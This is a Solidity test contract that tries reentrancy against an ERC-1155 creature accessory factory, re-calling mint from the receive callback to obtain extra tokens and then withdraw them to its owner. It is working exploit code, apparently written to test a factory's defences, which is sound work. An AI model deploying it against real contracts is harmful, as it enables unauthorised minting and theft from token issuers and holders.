// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @notice Minimal interfaces from OpenZeppelin and the factory to keep this file standalone
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface ICreatureAccessoryFactory {
    /// @notice expected signature used in your original code
    function mint(uint256 optionId, address to, uint256 amount, bytes calldata data) external;
}

/// @title TestForReentrancyAttack
/// @notice A configurable contract that attempts to reenter a factory via ERC-1155 callbacks.
/// Designed for testing; includes owner controls, counters and safety limits.
contract TestForReentrancyAttack is IERC1155Receiver, Ownable {
    // ERC-1155 receiver return signatures
    bytes4 private constant ERC1155_RECEIVED_SIG = 0xf23a6e61;
    bytes4 private constant ERC1155_BATCH_RECEIVED_SIG = 0xbc197c81;
    bytes4 private constant INTERFACE_ERC1155_RECEIVER_FULL = 0x4e2312e0;
    bytes4 private constant INTERFACE_ERC165 = 0x01ffc9a7;

    /// @notice Factory contract (must implement ICreatureAccessoryFactory.mint)
    ICreatureAccessoryFactory public factory;

    /// @notice Target total balance per token id before stopping reentrancy attempts
    uint256 public totalToMint = 3;

    /// @notice Tracks how many tokens of a given tokenId the contract currently holds (cached)
    mapping(uint256 => uint256) public cachedBalance;

    /// @notice Max recursion depth (safety)
    uint256 public maxRecursion = 10;

    /// @notice Tracks current recursive depth (resets between top-level calls)
    uint256 private recursionDepth;

    /// @notice Whether the attack behavior is enabled
    bool public attackEnabled = true;

    /// @notice Events for visibility and debugging
    event FactoryAddressSet(address indexed factory);
    event AttackEnabledSet(bool enabled);
    event TotalToMintSet(uint256 total);
    event MaxRecursionSet(uint256 maxDepth);
    event AttackStarted(uint256 optionId);
    event Withdrawal(address indexed to, uint256 tokenId, uint256 amount);

    constructor(address _factory) {
        if (_factory != address(0)) {
            factory = ICreatureAccessoryFactory(_factory);
            emit FactoryAddressSet(_factory);
        }
    }

    /// @notice Owner can set the factory address
    function setFactoryAddress(address _factory) external onlyOwner {
        require(_factory != address(0), "zero address");
        factory = ICreatureAccessoryFactory(_factory);
        emit FactoryAddressSet(_factory);
    }

    /// @notice Owner can set how many of a given token id we want to acquire before stopping
    function setTotalToMint(uint256 _totalToMint) external onlyOwner {
        require(_totalToMint > 0, "totalToMint > 0");
        totalToMint = _totalToMint;
        emit TotalToMintSet(_totalToMint);
    }

    /// @notice Enable/disable attack behavior from callbacks
    function setAttackEnabled(bool _enabled) external onlyOwner {
        attackEnabled = _enabled;
        emit AttackEnabledSet(_enabled);
    }

    /// @notice Set a maximum recursion depth to avoid gas exhaustion / infinite loops
    function setMaxRecursion(uint256 _max) external onlyOwner {
        require(_max > 0, "max > 0");
        maxRecursion = _max;
        emit MaxRecursionSet(_max);
    }

    /// @notice Owner triggers an initial mint from the factory to start the flow.
    /// @param optionId The factory option (your original code used `1` as the lootbox option)
    /// @param amount Amount to request (usually 1)
    function startAttack(uint256 optionId, uint256 amount) external onlyOwner {
        require(address(factory) != address(0), "factory not set");
        recursionDepth = 0; // reset depth at start
        emit AttackStarted(optionId);
        factory.mint(optionId, address(this), amount, "");
    }

    /// @inheritdoc IERC1155Receiver
    /// @dev Called when a single ERC1155 token is received. Attempts to re-call factory.mint()
    ///      until the contract's balance of `_id` reaches `totalToMint` or recursion limit reached.
    function onERC1155Received(
        address /*operator*/,
        address /*from*/,
        uint256 _id,
        uint256 /*value*/,
        bytes calldata /*data*/
    ) external override returns (bytes4) {
        // If attack behavior is disabled, simply return the selector.
        if (!attackEnabled) {
            return ERC1155_RECEIVED_SIG;
        }

        // Update cached balance from the token contract (trusted right now)
        uint256 balance = IERC1155(msg.sender).balanceOf(address(this), _id);
        cachedBalance[_id] = balance;

        // Safety: do not re-enter beyond maxRecursion
        if (recursionDepth >= maxRecursion) {
            return ERC1155_RECEIVED_SIG;
        }

        // If we still hold less than target, attempt to mint one more 'option' from factory
        if (balance < totalToMint && address(factory) != address(0)) {
            // increment recursion depth while we are about to call into factory
            recursionDepth += 1;
            // Note: factory.mint is expected to call back into onERC1155Received
            // which will again check recursionDepth and cached balances.
            try factory.mint(1, address(this), 1, "") {
                // success - nothing to do
            } catch {
                // swallow errors; do not revert the receipt
            }
            // decrement after returning from attempt
            recursionDepth -= 1;
        }

        return ERC1155_RECEIVED_SIG;
    }

    /// @inheritdoc IERC1155Receiver
    function onERC1155BatchReceived(
        address /*operator*/,
        address /*from*/,
        uint256[] memory _ids,
        uint256[] memory /*values*/,
        bytes memory /*data*/
    ) public override returns (bytes4) {
        // Update cached balances for ids (best-effort)
        for (uint256 i = 0; i < _ids.length; i++) {
            // Use the token contract that invoked this callback
            // `msg.sender` is the token contract (ERC-1155)
            cachedBalance[_ids[i]] = IERC1155(msg.sender).balanceOf(address(this), _ids[i]);
        }
        // For batch receipts we *do not* attempt to re-mint in this implementation.
        return ERC1155_BATCH_RECEIVED_SIG;
    }

    /// @notice Withdraw ERC-1155 tokens from this contract to owner
    function withdrawERC1155(address tokenContract, uint256 tokenId, uint256 amount) external onlyOwner {
        IERC1155(tokenContract).safeTransferFrom(address(this), owner(), tokenId, amount, "");
        emit Withdrawal(owner(), tokenId, amount);
    }

    /// @notice Query helper: get cached balance for token id
    function getCachedBalance(uint256 tokenId) external view returns (uint256) {
        return cachedBalance[tokenId];
    }

    /// @inheritdoc IERC165
    function supportsInterface(bytes4 interfaceID) external pure override returns (bool) {
        return interfaceID == INTERFACE_ERC165 || interfaceID == INTERFACE_ERC1155_RECEIVER_FULL;
    }
}

